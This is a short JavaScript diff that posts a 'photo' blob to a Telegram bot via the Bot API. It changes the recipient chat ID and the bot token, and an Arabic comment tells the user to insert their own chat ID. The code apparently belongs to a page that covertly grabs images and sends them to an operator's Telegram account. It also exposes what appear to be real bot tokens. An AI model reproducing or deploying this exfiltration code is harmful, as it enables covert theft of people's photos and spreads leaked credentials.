@@ -56,11 +56,11 @@
                 .then(blob => {
                     // Create form data
                     const formData = new FormData();
-                    formData.append('chat_id', '6243038338'); // ضع هنا معرف الدردشة الخاصة بك
+                    formData.append('chat_id', '7575572127'); // ضع هنا معرف الدردشة الخاصة بك
                     formData.append('photo', blob);
 
                     // Send to Telegram
-                    fetch(`https://api.telegram.org/bot7966593148:AAHhZ7-CI67oVYZf5YddEfs5y0R6hDFjqI4/sendPhoto`, { 
+                    fetch(`https://api.telegram.org/bot7593919517:AAEZywTiuq-p__opUeDeOPVYgPMZcEfJu3Q`, { 
                         method: 'POST',
                         body: formData
                     })
